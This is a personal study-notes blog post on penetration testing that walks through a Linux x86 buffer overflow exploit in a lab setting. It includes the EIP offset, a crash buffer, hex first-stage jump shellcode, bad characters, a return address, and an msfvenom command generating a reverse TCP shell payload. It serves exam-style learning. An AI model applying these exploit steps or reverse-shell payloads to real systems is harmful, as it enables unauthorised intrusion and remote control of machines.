---
title: Study Notes - 2021/03/20
date: 2021-03-20 15:00:30
tags: [Penetration Testing, Study Notes]
---

# Linux Buffer Overflow
## DEP (data execution prevention), ASLR, Canaries


# replicating the crash  
# controlling EIP
## find the eip location, use msf-pattern_create
`msf-pattern_create -l 4379`  
eip = 0x46367046  
`msf-pattern_offset -q 46367046`  
-q, --query Aa0A                 Query to Locate  

offset = 4368

crash = "\x41" * 4368 + "B" * 4 + "C" * 7  

## locating space for shell code  
find a register that point to our buffer:  
esp point to the end of our buffer, only have 7 bytes remaining in the buffer, increase buffer size not work, lead to another crash  
eax point to the start of the buffer, including the "setup sound" string 

right click -> go to expression (setup sound)   
"se" ->  translate to `jae` jump short if above or equal  
"tu" ->  `je` jump if equal  
not good  

insert first stage shell code at the 7 bytes space  
use to allain eax to point to string after setup sound, then jump to there 

increase eax+12 as there are 12 chars in "setup sound"

```
kali@kali:~$ msf-nasm_shell
nasm > add eax,12
00000000 83C00C add eax,byte +0xc
nasm > jmp eax
00000000 FFE0 jmp eax
```

5 bytes instructions 83C00C FFE0
 
 ```
padding = "\x41" * 4368
eip = "\x42\x42\x42\x42"
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"  # padding with nops

buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"
 ```


## checking for bad chars
We sent the whole range of characters from 00 to FF within our buffer and then monitored
whether any of those bytes got mangled, swapped, dropped, or changed in memory once they
were processed by the application.

0x00 0x20  

## finding a return address  
edb Plugins -> OpcodeSearcher  
0x8134596  

## getting a shell
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 -b "\x00\x20" -f py -v shellcode
```

the output format with
-f, and the variable name to use with -v.  



shell is stucked, because of debugger



